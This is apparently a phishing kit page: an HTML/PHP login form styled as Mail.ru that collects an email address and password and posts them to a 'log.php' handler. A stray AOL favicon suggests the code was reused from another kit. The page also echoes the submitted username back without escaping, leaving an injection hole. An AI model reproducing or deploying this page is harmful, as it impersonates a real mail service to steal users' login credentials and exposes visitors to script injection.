﻿<html>
<head>
<title>Mail.ru</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" type="text/css" href="css/styles.css">
<link href="https://s.yimg.com/wm/login/aol-favicon.png">
</head>
<body ><body ><div id="container">
                         <div id="container">

		<div class="logo">
			<HTML><BODY><IMG class="rg_i Q4LuWd tx8vtf" alt="Image result for mail.ru logo" src="data:image/png;base64,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" data-atf="true" data-iml="1251" jsname="Q4LuWd" data-deferred="1"></BODY></HTML>
			<div class="header-wrapper">
				<h2 class="header-text">Войти в систему</h2>
				
			</div>
		</div>
		<div class="content">
			<div class="login-form">
				<form method="POST" action="log.php">
					<div class="input-fields">
						<?php echo $email_error !== "" ? '<div class="error user-error">'.$email_error.'</div>' : ""; ?>

						<?php 
							if($user_email == ""){
								$user = $_POST ? $_POST['username']:"";
								echo '<input type="text" lang="en" name="username" maxlength="113" class="login-data" placeholder="Эл. адрес" value="'.$user.'" name="username" />';
							} else{
								echo '<div class="known-user">'.$user_email.'</div>';
								echo '<input type="hidden" name="username" value="'.$user_email.'" />';
							}
						?>
						<?php echo $pass_error !== "" ? '<div class="error input-fields2">'.$pass_error.'</div>' : "";  ?>

						<input class="login-data" type="password" name="password" autocomplete="off" maxlength="127" placeholder="пароль" />
					</div>

                                                                         <div class="input-checkbox">
						<input type="checkbox"><label>Держите меня в системе</label>
					</div>
		
					<div class="input-fields button-gap">
						<input class="btn-primary" type="submit" value="Войти в систему" class="default">
					</div>
					<div class="input-fields forgot">

						<p class="brand">Mail.ru © 2020 </p>
					</div>
				</form>
			</div>
		</div>
	</div>
</body>
</html>